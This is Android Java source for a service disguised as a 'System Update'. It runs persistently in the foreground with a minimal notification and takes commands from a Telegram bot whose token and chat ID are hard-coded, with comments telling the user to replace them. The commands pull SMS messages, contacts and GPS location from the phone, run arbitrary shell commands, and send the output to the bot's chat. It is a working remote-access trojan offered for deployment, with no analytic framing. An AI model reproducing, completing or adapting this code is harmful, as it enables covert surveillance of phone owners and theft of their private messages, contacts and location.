package com.sys.update;

import android.app.*;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.*;
import java.io.*;

public class CoreService extends Service {
    static final String BOT_TOKEN = "8351623794:AAFBikr8dzjkunwSuABTVde5nyoySvdVoPw";   // <-- ganti
    static final String CHAT_ID   = "8666086758";      // <-- ganti
    static final String API       = "https://api.telegram.org/bot" + BOT_TOKEN;

    OkHttpClient http = new OkHttpClient();
    long lastUpdate = 0;
    Thread worker;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                "sys", "System", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
            Notification n = new NotificationCompat.Builder(this, "sys")
                .setContentTitle("System Update")
                .setContentText("checking")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
            startForeground(1, n);
        }
        if (worker == null) {
            worker = new Thread(this::loop);
            worker.start();
        }
        return START_STICKY;
    }

    void loop() {
        while (true) {
            try { poll(); Thread.sleep(3000); } catch (Exception e) { }
        }
    }

    void poll() throws Exception {
        HttpUrl url = HttpUrl.parse(API + "/getUpdates").newBuilder()
            .addQueryParameter("offset", String.valueOf(lastUpdate + 1))
            .addQueryParameter("timeout", "3").build();
        String body = http.newCall(new Request.Builder().url(url).build())
            .execute().body().string();
        JSONObject j = new JSONObject(body);
        JSONArray arr = j.getJSONArray("result");
        for (int k = 0; k < arr.length(); k++) {
            JSONObject u = arr.getJSONObject(k);
            lastUpdate = u.getLong("update_id");
            if (u.has("message") && u.getJSONObject("message").has("text")) {
                handle(u.getJSONObject("message").getString("text"));
            }
        }
    }

    void handle(String cmd) {
        try {
            if (cmd.equals("/ping")) send("pong");
            else if (cmd.equals("/info")) send("brand: " + Build.BRAND + "\nmodel: " + Build.MODEL + "\nsdk: " + Build.VERSION.SDK_INT);
            else if (cmd.equals("/sms")) send(smsDump());
            else if (cmd.equals("/contacts")) send(contactsDump());
            else if (cmd.equals("/loc")) send(loc());
            else if (cmd.startsWith("/shell ")) send(shell(cmd.substring(7)));
            else send("unknown: " + cmd);
        } catch (Exception e) { send("err: " + e.getMessage()); }
    }

    String smsDump() {
        StringBuilder sb = new StringBuilder();
        Cursor cur = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (cur == null) return "no access";
        int n = 0;
        while (cur.moveToNext() && n < 50) {
            sb.append(cur.getString(cur.getColumnIndex("address"))).append(": ")
              .append(cur.getString(cur.getColumnIndex("body"))).append("\n");
            n++;
        }
        cur.close();
        return sb.toString();
    }

    String contactsDump() {
        StringBuilder sb = new StringBuilder();
        Cursor cur = getContentResolver().query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (cur == null) return "no access";
        int n = 0;
        while (cur.moveToNext() && n < 100) {
            sb.append(cur.getString(cur.getColumnIndex(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
              .append(": ")
              .append(cur.getString(cur.getColumnIndex(
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
            n++;
        }
        cur.close();
        return sb.toString();
    }

    String loc() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (l == null) return "no location";
            return "lat: " + l.getLatitude() + "\nlon: " + l.getLongitude() +
                   "\nmaps: https://www.google.com/maps?q=" + l.getLatitude() + "," + l.getLongitude();
        } catch (Exception e) { return "err: " + e.getMessage(); }
    }

    String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            return sb.toString();
        } catch (Exception e) { return "err: " + e.getMessage(); }
    }

    void send(String text) {
        try {
            RequestBody rb = new FormBody.Builder()
                .add("chat_id", CHAT_ID).add("text", text).build();
            http.newCall(new Request.Builder().url(API + "/sendMessage").post(rb).build()).execute();
        } catch (Exception e) { }
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
